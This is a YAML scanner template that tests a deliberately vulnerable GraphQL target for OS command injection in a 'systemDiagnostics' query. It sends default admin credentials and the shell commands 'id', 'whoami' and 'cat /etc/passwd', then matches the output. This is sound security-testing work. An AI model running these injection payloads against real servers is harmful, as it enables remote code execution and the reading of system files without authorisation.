id: api8-command-injection-vulnerable-graphql
info:
  name: "vulnerable-graphql - Command Injection via systemDiagnostics"
  category: "API8:2023 Security Misconfiguration"
  severity: "CRITICAL"
  author: "hadrian"
  description: "Tests for OS command injection in the in-house GraphQL target's systemDiagnostics query. The cmd parameter executes arbitrary shell commands via exec.Command(sh,-c,cmd). Attackers can run any OS command on the server."
  tags: ["graphql", "owasp", "owasp-api-top10", "vulnerable-graphql", "command-injection", "rce"]
  requires_llm_triage: true
  test_pattern: "simple"

endpoint_selector:
  requires_auth: false

role_selector:
  attacker_permission_level: "all"
  victim_permission_level: "all"

graphql:
  - query: |
      {
        systemDiagnostics(username: "admin", password: "admin", cmd: "id")
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["uid=", "gid="]
        part: body
        condition: or

  - query: |
      {
        systemDiagnostics(username: "admin", password: "admin", cmd: "whoami")
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["data", "systemDiagnostics"]
        part: body

  - query: |
      {
        systemDiagnostics(username: "admin", password: "admin", cmd: "cat /etc/passwd")
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["root:", "systemDiagnostics"]
        part: body
        condition: or

detection:
  success_indicators:
    - type: status_code
      status_code: 200
    - type: body_field
      body_field: "data.systemDiagnostics"
      exists: true
    - type: body_field
      body_field: "errors"
      exists: false
  vulnerability_pattern: "vulnerable_graphql_command_injection_systemdiagnostics"
